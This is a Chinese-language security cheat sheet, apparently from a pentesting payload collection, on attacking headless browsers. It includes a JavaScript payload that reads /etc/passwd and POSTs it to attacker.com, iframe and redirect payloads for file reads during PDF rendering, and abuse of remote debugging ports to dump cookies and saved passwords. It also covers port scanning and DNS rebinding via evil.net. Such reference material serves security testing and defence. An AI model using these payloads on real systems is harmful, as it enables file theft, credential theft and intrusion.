[原文文档](README.en.md)

# 无头浏览器

> 无头浏览器是没有图形用户界面的 Web 浏览器。它像常规浏览器（如 Chrome 或 Firefox）一样工作，通过解释 HTML、CSS 和 JavaScript，但它在后台执行，不显示任何视觉效果。
> 无头浏览器主要用于自动化任务，如 Web 抓取、测试和运行脚本。它们在没有完整浏览器需要的情况下，或在资源（如内存或 CPU）受限的情况下特别有用。

## 摘要

* [无头浏览器命令](#headless-commands)
* [本地文件读取](#local-file-read)
* [远程调试端口](#remote-debugging-port)
* [网络](#network)
    * [端口扫描](#port-scanning)
    * [DNS 重新绑定](#dns-rebinding)
* [CVE](#cve)
* [参考资料](#references)

## 无头浏览器命令

无头浏览器命令示例：

* Google Chrome

    ```ps1
    google-chrome --headless[=(new|old)] --print-to-pdf https://www.google.com
    ```

* Mozilla Firefox

    ```ps1
    firefox --screenshot https://www.google.com
    ```

* Microsoft Edge

    ```ps1
    "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu --window-size=1280,720 --screenshot="C:\tmp\screen.png" "https://google.com"
    ```

## 本地文件读取

### 不安全标志

如果目标使用 `--allow-file-access` 选项启动

```ps1
google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run --disable-web-security -–allow-file-access-from-files --allow-file-access --allow-cross-origin-auth-prompt --user-data-dir
```

由于允许文件访问，攻击者可以创建并暴露一个 HTML 文件，该文件捕获 `/etc/passwd` 文件的内容。

```js
<script>
  async function getFlag(){
    response = await fetch("file:///etc/passwd");
    flag = await response.text();
    fetch("https://attacker.com/", { method: "POST", body: flag})
  };
  getFlag();
</script>
```

### PDF 渲染

考虑一种场景，无头浏览器捕获网页的副本并将其导出为 PDF，而攻击者控制正在处理的 URL。

目标：`google-chrome-stable --headless[=(new|old)] --print-to-pdf https://site/file.html`

* JavaScript 重定向

    ```html
    <html>
        <body>
            <script>
                window.location="/etc/passwd"
            </script>
        </body>
    </html>
    ```

* Iframe

    ```html
    <html>
        <body>
            <iframe src="/etc/passwd" height="640" width="640"></iframe>
        </body>
    </html>
    ```

## 远程调试端口

无头浏览器（如 Headless Chrome 或 Chromium）中的远程调试端口是一个 TCP 端口，暴露浏览器的 DevTools 协议，以便外部工具（或脚本）可以远程连接和控制浏览器。它通常在端口 **9222** 上监听，但可以使用 `--remote-debugging-port=` 更改。

**目标**：`google-chrome-stable --headless=new --remote-debugging-port=XXXX ./index.html`

**工具**：

* [slyd0g/WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) - 与基于 Chromium 的浏览器的调试端口交互以查看打开的标签、安装的扩展和 Cookie
* [slyd0g/ripWCMN.py](https://gist.githubusercontent.com/slyd0g/955e7dde432252958e4ecd947b8a7106/raw/d96c939adc66a85fa9464cec4150543eee551356/ripWCMN.py) - 使用 Python 的 WCMN 替代方案，以修复带有空 `origin` 头的 WebSocket 连接。

> [!NOTE]  
> 自 2022 年 12 月 20 日的 Chrome 更新后，您必须使用参数 `--remote-allow-origins="*"` 启动浏览器才能使用 WhiteChocolateMacademiaNut 连接到 WebSocket。

**利用**：

* 连接并与浏览器交互：`chrome://inspect/#devices`，`opera://inspect/#devices`
* 终止当前运行的浏览器并使用 `--restore-last-session` 访问用户的标签
* 设置中存储的数据（用户名、密码、令牌）：`chrome://settings`
* 端口扫描：循环打开 `http://localhost:<port>/json/new?http://callback.example.com?port=<port>`
* 泄露 UUID：Iframe：`http://127.0.0.1:<port>/json/version`

    ```json
    {
        "Browser": "Chrome/136.0.7103.113",
        "Protocol-Version": "1.3",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/136.0.0.0 Safari/537.36",
        "V8-Version": "13.6.233.10",
        "WebKit-Version": "537.36 (@76fa3c1782406c63308c70b54f228fd39c7aaa71)",
        "webSocketDebuggerUrl": "ws://127.0.0.1:9222/devtools/browser/d815e18d-57e6-4274-a307-98649a9e6b87"
    }
    ```

* 本地文件读取：[pich4ya/chrome_remote_debug_lfi.py](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)
* Node 检查器 `--inspect` 的工作方式类似于 `--remote-debugging-port`

    ```ps1
    node --inspect app.js # 默认端口 9229
    node --inspect=4444 app.js # 自定义端口 4444
    node --inspect=0.0.0.0:4444 app.js
    ```

从 Chrome 136 开始，如果尝试调试默认的 Chrome 数据目录，则不会遵守 `--remote-debugging-port` 和 `--remote-debugging-pipe` 开关。这些开关现在必须伴随 `--user-data-dir` 开关指向非标准目录。

标志 `--user-data-dir=/path/to/data_dir` 用于指定用户的数据目录，Chromium 存储其所有应用程序数据（如 Cookie 和历史记录）。如果启动 Chromium 时未指定此标志，您将注意到书签、收藏夹或历史记录都不会加载到浏览器中。

## 网络

### 端口扫描

端口扫描：时序攻击

* 动态插入指向假设关闭端口的 `<img>` 标签。测量到 onerror 的时间。
* 重复至少 10 次 → 获取关闭端口错误的平均时间
* 随机测试端口 10 次并测量错误时间
* 如果 `time_to_error(random_port) > time_to_error(closed_port)*1.3` → 端口已打开

**考虑**：

* Chrome 默认阻止"已知端口"列表
* Chrome 阻止通过 0.0.0.0 访问本地网络地址，localhost 除外

### DNS 重新绑定

* [nccgroup/singularity](https://github.com/nccgroup/singularity) - DNS 重新绑定攻击框架。

1. Chrome 将发出 2 个 DNS 请求：`A` 和 `AAAA` 记录
    * `AAAA` 响应带有有效的互联网 IP
    * `A` 响应带有内部 IP
2. Chrome 将优先连接到 IPv6 (evil.net)
3. 在第一次响应后立即关闭 IPv6 监听器
4. 打开指向 evil.net 的 Iframe
5. Chrome 将尝试连接到 IPv6，但由于会失败，它将回退到 IPv4
6. 从顶级窗口，将脚本注入 iframe 以泄露内容

## CVE

使用已知漏洞（CVE）利用无头浏览器涉及几个步骤，从漏洞研究到载荷执行。以下是过程的结构化分解：

使用 User-Agent 识别无头浏览器，然后选择针对浏览器组件的利用：V8 引擎、Blink 渲染器、Webkit 等。

* Chrome CVE：[2024-9122 - 由于导入标签签名子类型导致的 WASM 类型混淆](https://issues.chromium.org/issues/365802567)，[CVE-2025-5419 - V8 中的越界读写](https://nvd.nist.gov/vuln/detail/CVE-2025-5419)
* Firefox：[CVE-2024-9680 - 释放后使用](https://nvd.nist.gov/vuln/detail/CVE-2024-9680)

`--no-sandbox` 选项禁用渲染器进程的沙箱功能。

```js
const browser = await puppeteer.launch({
    args: ['--no-sandbox']
});
```

## 参考资料

* [基于浏览器的 JavaScript 端口扫描 - Nikolai Tschacher - 2021年1月10日](https://incolumitas.com/2021/01/10/browser-based-port-scanning/)
* [更改远程调试开关以提高安全性 - Will Harris - 2025年3月17日](https://developer.chrome.com/blog/remote-debugging-port)
* [Chrome DevTools 协议 - 文档 - 2017年7月3日](https://chromedevtools.github.io/devtools-protocol/)
* [Chromium 远程调试端口的 Cookie - Justin Bui - 2020年12月17日](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
* [使用 Chromium 远程调试器调试 Cookie 转储失败 - Justin Bui - 2023年7月16日](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)
* [Node 检查器/CEF 调试滥用 - HackTricks - 2024年7月18日](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse)
* [后渗透：滥用 Chrome 的调试功能远程观察和控制浏览会话 - wunderwuzzi - 2020年4月28日](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
* [太懒获取 XSS？那就使用 n-days 在管理机器人中获取 RCE - Jopraveen - 2025年3月2日](https://jopraveen.github.io/web-hackthebot/)
* [在 Chrome 和 Safari 中可靠的分秒 DNS 重新绑定技巧 - Daniel Thatcher - 2023年12月6日](https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari)